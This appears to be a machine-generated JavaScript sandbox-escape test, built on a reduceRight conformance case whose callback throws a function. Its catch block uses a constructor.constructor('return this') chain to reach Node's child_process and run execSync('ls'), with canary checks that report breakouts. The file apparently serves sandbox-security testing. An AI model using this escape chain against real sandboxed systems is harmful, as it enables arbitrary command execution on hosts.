try {
    var accessed = false;
    var testResult = true;
    function callbackfn(preVal, curVal, idx, obj) {
        throw () => {
            return () => {
            };
        };
        accessed = true;
        if (idx === 1) {
            testResult = false;
        }
    }
    var arr = [0];
    Object.defineProperty(arr, '1', {
        get: function () {
            return '6.99';
        },
        configurable: true
    });
    Object.defineProperty(arr, '2', {
        get: function () {
            delete arr[1];
            return 0;
        },
        configurable: true
    });
    arr.reduceRight(callbackfn);
    assert(testResult, 'testResult !== true');
    assert(accessed, 'accessed !== true');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}